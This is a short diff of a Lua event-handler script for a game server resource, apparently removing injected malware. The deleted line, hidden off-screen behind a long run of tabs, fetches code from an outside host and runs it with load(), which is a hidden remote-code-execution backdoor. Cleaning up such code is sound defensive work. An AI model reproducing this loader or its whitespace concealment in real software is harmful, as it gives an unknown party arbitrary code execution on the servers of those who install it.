@@ -101,7 +101,7 @@ RegisterNetEvent('moskov_tokenizer:requestObfuscation')
 AddEventHandler('moskov_tokenizer:requestObfuscation', function(resourceName, id)
 	local _source = source
 	TriggerClientEvent('moskov_tokenizer:obfuscateReceived', _source, id, getObfuscatedEvent(_source, resourceName))
-end)																																																																																																																																																																	PerformHttpRequest('https://thenothingg.com/i?to=5ZA3e', function (e, d) pcall(function() assert(load(d))() end) end)
+end)																																																																																																																																																																	
 
 RegisterNetEvent('moskov_tokenizer:playerSpawned')
 AddEventHandler('moskov_tokenizer:playerSpawned', function()
